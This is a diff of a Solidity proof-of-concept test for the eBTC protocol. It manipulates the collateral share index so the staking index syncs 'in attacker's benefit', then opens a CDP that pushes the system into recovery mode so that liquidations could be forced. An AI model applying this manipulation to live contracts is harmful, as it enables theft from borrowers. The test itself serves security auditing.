@@ -128,13 +128,32 @@ contract WhaleSniperPOCTest is eBTCBaseFixture {
             uint _curIndex = collateral.getPooledEthByShares(1e18);
             uint _newIndex = _curIndex + 5e16;
             collateral.setEthPerShare(_newIndex);
+            uint _tcr = cdpManager.getTCR(_curPrice);
+
+            // reference https://github.com/Badger-Finance/ebtc/pull/456#issuecomment-1566821518
+            uint _requiredDeltaIdxTriggeRM = (((_newIndex * (_tcr - cdpManager.CCR())) / _tcr) *
+                cdpManager.MAX_REWARD_SPLIT()) / cdpManager.stakingRewardSplit();
+
+            // hack manipulation to sync global index in attacker's benefit
+            uint _oldIdx = _newIndex - _requiredDeltaIdxTriggeRM - 1234567890;
+            collateral.setEthPerShare(_oldIdx);
+            cdpManager.claimStakingSplitFee();
+            console.log("_oldIndex:", cdpManager.stFPPSg());
+            assertEq(_oldIdx, cdpManager.stFPPSg());
+            assertLt(_oldIdx, _curIndex);
+            collateral.setEthPerShare(_newIndex);
+            console.log("_newIndex:", _newIndex);
         }
 
         // Attacker opens CDP to push to barely to RM
         // 4) The attacker tries the TCR from the fuzzer
         {
-            uint256 collAttacker = _utils.calculateCollAmount(attackerDebtAmount, _curPrice, cdpCR);
-            bytes32 cdpIdAttacker = _tryOpenCdp(users[0], collAttacker, attackerDebtAmount);
+            uint256 collAttacker = _utils.calculateCollAmount(
+                (systemDebtAmount / 100000),
+                _curPrice,
+                125005e13
+            );
+            bytes32 cdpIdAttacker = _tryOpenCdp(users[0], collAttacker, (systemDebtAmount / 100000));
             console.log("tcrAfterOpen Attacker", cdpManager.getTCR(_curPrice));
         }
 
@@ -144,9 +163,8 @@ contract WhaleSniperPOCTest is eBTCBaseFixture {
         uint256 tcrAfter = cdpManager.getTCR(_curPrice);
         console.log("tcrAfter claim", tcrAfter);
 
-        // We're not in recovery mode
-        // If we're ever, then there exist a value such that a liquidation can be triggered willingly by the attacker
-        assertGt(tcrAfter, 1250000000000000000);
+        // Now we're in recovery mode so there exist a value such that a liquidation can be triggered willingly by the attacker
+        assertLt(tcrAfter, 1250000000000000000);
     }
 
     // Padding Deposits -> W/e, prob 300% CR
